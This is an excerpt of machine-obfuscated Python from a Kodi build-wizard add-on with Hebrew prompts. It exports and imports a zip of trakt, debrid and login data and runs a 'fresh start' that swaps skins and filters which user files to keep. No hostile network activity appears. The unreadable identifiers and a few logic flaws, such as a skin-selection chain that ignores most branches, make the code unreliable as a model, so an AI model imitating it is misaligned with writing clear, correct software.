			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4459
			return #line:4460
		OOO0O00000O0OO0O0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4461
		OOOOO00OO00O0O0O0 =xbmcvfs .copy (OO0OOOO0O0OOOO000 ,OOO0O00000O0OO0O0 )#line:4462
		wiz .log ("%s"%str (OOOOO00OO00O0O0O0 ))#line:4463
		extract .all (xbmc .translatePath (OOO0O00000O0OO0O0 ),OOO0O0OO0OOO00O0O )#line:4464
		O0O000OOOO00OOOO0 =os .path .join (OOO0O0OO0OOO00O0O ,'trakt')#line:4465
		O0O0O0O000000OOOO =os .path .join (OOO0O0OO0OOO00O0O ,'login')#line:4466
		O0OOOOOO00O0O0O00 =os .path .join (OOO0O0OO0OOO00O0O ,'debrid')#line:4467
		O00OO0OO0O0O0O00O =0 #line:4468
		if os .path .exists (O0O000OOOO00OOOO0 ):#line:4469
			O00OO0OO0O0O0O00O +=1 #line:4470
			OO00OO00OOO0O0O0O =os .listdir (O0O000OOOO00OOOO0 )#line:4471
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4472
			for OO00OO00O00OOOO0O in OO00OO00OOO0O0O0O :#line:4473
				OOO0OO0O0OO0OO000 =os .path .join (traktit .TRAKTFOLD ,OO00OO00O00OOOO0O )#line:4474
				O00OOO0000OOO0000 =os .path .join (O0O000OOOO00OOOO0 ,OO00OO00O00OOOO0O )#line:4475
				if os .path .exists (OOO0OO0O0OO0OO000 ):#line:4476
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO00O00OOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4477
					else :os .remove (OOO0OO0O0OO0OO000 )#line:4478
				shutil .copy (O00OOO0000OOO0000 ,OOO0OO0O0OO0OO000 )#line:4479
			traktit .importlist ('all')#line:4480
			traktit .traktIt ('restore','all')#line:4481
		if os .path .exists (O0O0O0O000000OOOO ):#line:4482
			O00OO0OO0O0O0O00O +=1 #line:4483
			OO00OO00OOO0O0O0O =os .listdir (O0O0O0O000000OOOO )#line:4484
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4485
			for OO00OO00O00OOOO0O in OO00OO00OOO0O0O0O :#line:4486
				OOO0OO0O0OO0OO000 =os .path .join (loginit .LOGINFOLD ,OO00OO00O00OOOO0O )#line:4487
				O00OOO0000OOO0000 =os .path .join (O0O0O0O000000OOOO ,OO00OO00O00OOOO0O )#line:4488
				if os .path .exists (OOO0OO0O0OO0OO000 ):#line:4489
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO00O00OOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4490
					else :os .remove (OOO0OO0O0OO0OO000 )#line:4491
				shutil .copy (O00OOO0000OOO0000 ,OOO0OO0O0OO0OO000 )#line:4492
			loginit .importlist ('all')#line:4493
			loginit .loginIt ('restore','all')#line:4494
		if os .path .exists (O0OOOOOO00O0O0O00 ):#line:4495
			O00OO0OO0O0O0O00O +=1 #line:4496
			OO00OO00OOO0O0O0O =os .listdir (O0OOOOOO00O0O0O00 )#line:4497
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4498
			for OO00OO00O00OOOO0O in OO00OO00OOO0O0O0O :#line:4499
				OOO0OO0O0OO0OO000 =os .path .join (debridit .REALFOLD ,OO00OO00O00OOOO0O )#line:4500
				O00OOO0000OOO0000 =os .path .join (O0OOOOOO00O0O0O00 ,OO00OO00O00OOOO0O )#line:4501
				if os .path .exists (OOO0OO0O0OO0OO000 ):#line:4502
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO00O00OOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4503
					else :os .remove (OOO0OO0O0OO0OO000 )#line:4504
				shutil .copy (O00OOO0000OOO0000 ,OOO0OO0O0OO0OO000 )#line:4505
			debridit .importlist ('all')#line:4506
			debridit .debridIt ('restore','all')#line:4507
		wiz .cleanHouse (OOO0O0OO0OOO00O0O )#line:4508
		wiz .removeFolder (OOO0O0OO0OOO00O0O )#line:4509
		os .remove (OOO0O00000O0OO0O0 )#line:4510
		if O00OO0OO0O0O0O00O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4511
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4512
	elif O0O0OO0OO0OOOOOO0 =='export':#line:4513
		O0OOOO000O000O0OO =xbmc .translatePath (MYBUILDS )#line:4514
		OO0OOO0OO00OOO0O0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4515
		traktit .traktIt ('update','all')#line:4516
		loginit .loginIt ('update','all')#line:4517
		debridit .debridIt ('update','all')#line:4518
		OO0OOOO0O0OOOO000 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4519
		OO0OOOO0O0OOOO000 =xbmc .translatePath (OO0OOOO0O0OOOO000 )#line:4520
		OO0O000O0OOOOO00O =os .path .join (O0OOOO000O000O0OO ,'SaveData.zip')#line:4521
		OO0OO0O0O000OOOOO =zipfile .ZipFile (OO0O000O0OOOOO00O ,mode ='w')#line:4522
		for O0O0OOO00O0OOO0O0 in OO0OOO0OO00OOO0O0 :#line:4523
			if os .path .exists (O0O0OOO00O0OOO0O0 ):#line:4524
				OO00OO00OOO0O0O0O =os .listdir (O0O0OOO00O0OOO0O0 )#line:4525
				for OOOOOOOO0OO000O0O in OO00OO00OOO0O0O0O :#line:4526
					OO0OO0O0O000OOOOO .write (os .path .join (O0O0OOO00O0OOO0O0 ,OOOOOOOO0OO000O0O ),os .path .join (O0O0OOO00O0OOO0O0 ,OOOOOOOO0OO000O0O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4527
		OO0OO0O0O000OOOOO .close ()#line:4528
		if OO0OOOO0O0OOOO000 ==O0OOOO000O000O0OO :#line:4529
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O000O0OOOOO00O ))#line:4530
		else :#line:4531
			try :#line:4532
				xbmcvfs .copy (OO0O000O0OOOOO00O ,os .path .join (OO0OOOO0O0OOOO000 ,'SaveData.zip'))#line:4533
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO0OOOO0O0OOOO000 ,'SaveData.zip')))#line:4534
			except :#line:4535
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O000O0OOOOO00O ))#line:4536
def freshStart (install =None ,over =False ):#line:4541
	if USERNAME =='':#line:4542
		ADDON .openSettings ()#line:4543
		sys .exit ()#line:4544
	OO0O0O0OOOO0OOOOO =u_list (SPEEDFILE )#line:4545
	(OO0O0O0OOOO0OOOOO )#line:4546
	O00O00OO00O0O0O00 =(wiz .workingURL (OO0O0O0OOOO0OOOOO ))#line:4547
	(O00O00OO00O0O0O00 )#line:4548
	if KEEPTRAKT =='true':#line:4549
		traktit .autoUpdate ('all')#line:4550
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4551
	if KEEPREAL =='true':#line:4552
		debridit .autoUpdate ('all')#line:4553
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4554
	if KEEPLOGIN =='true':#line:4555
		loginit .autoUpdate ('all')#line:4556
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4557
	if over ==True :O0OO00O000O00OOOO =1 #line:4558
	elif install =='restore':O0OO00O000O00OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4559
	elif install :O0OO00O000O00OOOO =1 #line:4560
	else :O0OO00O000O00OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4561
	if O0OO00O000O00OOOO :#line:4562
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4563
			O0O0OOO0OOOO0O000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4564
			skinSwitch .swapSkins (O0O0OOO0OOOO0O000 )#line:4567
			OOO00OO00O0OOOO00 =0 #line:4568
			xbmc .sleep (1000 )#line:4569
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO00OO00O0OOOO00 <150 :#line:4570
				OOO00OO00O0OOOO00 +=1 #line:4571
				xbmc .sleep (1000 )#line:4572
				wiz .ebi ('SendAction(Select)')#line:4573
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4574
				wiz .ebi ('SendClick(11)')#line:4575
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4576
			xbmc .sleep (1000 )#line:4577
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4578
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4579
			return #line:4580
		wiz .addonUpdates ('set')#line:4581
		O0OO00O00O0O00O0O =os .path .abspath (HOME )#line:4582
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4583
		O0OO00OOOO0O00OOO =sum ([len (O0O00OO0OOO0OO0O0 )for O00000OO0OOO00OO0 ,O0OO0000OO0O0O0OO ,O0O00OO0OOO0OO0O0 in os .walk (O0OO00O00O0O00O0O )]);OO000OO0O0000OOO0 =0 #line:4584
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4585
		EXCLUDES .append ('My_Builds')#line:4586
		EXCLUDES .append ('archive_cache')#line:4587
		EXCLUDES .append ('script.module.requests')#line:4588
		EXCLUDES .append ('myfav.anon')#line:4589
		if KEEPREPOS =='true':#line:4590
			OO0OO0OO0OOO0O0O0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4591
			for OOOO0OO00OO0O00O0 in OO0OO0OO0OOO0O0O0 :#line:4592
				OO0OO0O00O0O0OO00 =os .path .split (OOOO0OO00OO0O00O0 [:-1 ])[1 ]#line:4593
				if not OO0OO0O00O0O0OO00 ==EXCLUDES :#line:4594
					EXCLUDES .append (OO0OO0O00O0O0OO00 )#line:4595
		if KEEPSUPER =='true':#line:4596
			EXCLUDES .append ('plugin.program.super.favourites')#line:4597
		if KEEPMOVIELIST =='true':#line:4598
			EXCLUDES .append ('plugin.video.metalliq')#line:4599
		if KEEPMOVIELIST =='true':#line:4600
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4601
		if KEEPADDONS =='true':#line:4602
			EXCLUDES .append ('addons')#line:4603
		if KEEPADDONS =='true':#line:4604
			EXCLUDES .append ('addon_data')#line:4605
		EXCLUDES .append ('plugin.video.elementum')#line:4608
		EXCLUDES .append ('script.elementum.burst')#line:4609
		EXCLUDES .append ('script.elementum.burst-master')#line:4610
		EXCLUDES .append ('plugin.video.quasar')#line:4611
		EXCLUDES .append ('script.quasar.burst')#line:4612
		EXCLUDES .append ('skin.estuary')#line:4613
		if KEEPWHITELIST =='true':#line:4616
			OOO000O00OOOO0O00 =''#line:4617
			OO000OOOOO000OOOO =wiz .whiteList ('read')#line:4618
			if len (OO000OOOOO000OOOO )>0 :#line:4619
				for OOOO0OO00OO0O00O0 in OO000OOOOO000OOOO :#line:4620
					try :O0O0OOO000000000O ,O00000OO0OOOO0O0O ,OOOOOOO00OO000000 =OOOO0OO00OO0O00O0 #line:4621
					except :pass #line:4622
					if OOOOOOO00OO000000 .startswith ('pvr'):OOO000O00OOOO0O00 =O00000OO0OOOO0O0O #line:4623
					O0OOOOO0000000O0O =dependsList (OOOOOOO00OO000000 )#line:4624
					for OOOO00000OO00000O in O0OOOOO0000000O0O :#line:4625
						if not OOOO00000OO00000O in EXCLUDES :#line:4626
							EXCLUDES .append (OOOO00000OO00000O )#line:4627
						O000O00OO0OO0OO00 =dependsList (OOOO00000OO00000O )#line:4628
						for OOO00OOOOOOO00O00 in O000O00OO0OO0OO00 :#line:4629
							if not OOO00OOOOOOO00O00 in EXCLUDES :#line:4630
								EXCLUDES .append (OOO00OOOOOOO00O00 )#line:4631
					if not OOOOOOO00OO000000 in EXCLUDES :#line:4632
						EXCLUDES .append (OOOOOOO00OO000000 )#line:4633
				if not OOO000O00OOOO0O00 =='':wiz .setS ('pvrclient',OOOOOOO00OO000000 )#line:4634
		if wiz .getS ('pvrclient')=='':#line:4635
			for OOOO0OO00OO0O00O0 in EXCLUDES :#line:4636
				if OOOO0OO00OO0O00O0 .startswith ('pvr'):#line:4637
					wiz .setS ('pvrclient',OOOO0OO00OO0O00O0 )#line:4638
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4639
		O0OOOOO00O0O00OOO =wiz .latestDB ('Addons')#line:4640
		for OO00OO00OO00OOOOO ,OOO0OO000O00OO000 ,O00O0000OOO0OOOO0 in os .walk (O0OO00O00O0O00O0O ,topdown =True ):#line:4641
			OOO0OO000O00OO000 [:]=[OOOOO000OO0OO00O0 for OOOOO000OO0OO00O0 in OOO0OO000O00OO000 if OOOOO000OO0OO00O0 not in EXCLUDES ]#line:4642
			for O0O0OOO000000000O in O00O0000OOO0OOOO0 :#line:4643
				OO000OO0O0000OOO0 +=1 #line:4644
				OOOOOOO00OO000000 =OO00OO00OO00OOOOO .replace ('/','\\').split ('\\')#line:4645
				OOO00OO00O0OOOO00 =len (OOOOOOO00OO000000 )-1 #line:4647
				if OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4648
				elif O0O0OOO000000000O =='MyVideos99.db'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4649
				elif O0O0OOO000000000O =='MyVideos107.db'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4650
				elif O0O0OOO000000000O =='MyVideos116.db'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4651
				elif O0O0OOO000000000O =='MyVideos99.db'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4652
				elif O0O0OOO000000000O =='MyVideos107.db'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4653
				elif O0O0OOO000000000O =='MyVideos116.db'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4654
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4655
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'skin.anonymous.mod'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4656
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'skin.Premium.mod'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4657
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'skin.anonymous.nox'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4658
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'skin.phenomenal'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4659
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4660
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'skin.titan'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4662
				elif OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4663
				elif O0O0OOO000000000O =='sources.xml'and OOOOOOO00OO000000 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4665
				elif O0O0OOO000000000O =='quicknav.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4668
				elif O0O0OOO000000000O =='x1101.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4669
				elif O0O0OOO000000000O =='b-srtym-b.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4670
				elif O0O0OOO000000000O =='x1102.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4671
				elif O0O0OOO000000000O =='b-sdrvt-b.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4672
				elif O0O0OOO000000000O =='x1112.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4673
				elif O0O0OOO000000000O =='b-tlvvyzyh-b.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4674
				elif O0O0OOO000000000O =='x1111.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4675
				elif O0O0OOO000000000O =='b-tvknyshrly-b.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4676
				elif O0O0OOO000000000O =='x1110.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4677
				elif O0O0OOO000000000O =='b-yldym-b.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4678
				elif O0O0OOO000000000O =='x1114.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4679
				elif O0O0OOO000000000O =='b-mvzyqh-b.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4680
				elif O0O0OOO000000000O =='mainmenu.DATA.xml'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4681
				elif O0O0OOO000000000O =='skin.Premium.mod.properties'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -2 ]=='userdata'and OOOOOOO00OO000000 [OOO00OO00O0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOO00OO000000 [OOO00OO00O0OOOO00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO00OO00OO00OOOOO ,O0O0OOO000000000O ),xbmc .LOGNOTICE )#line:4682
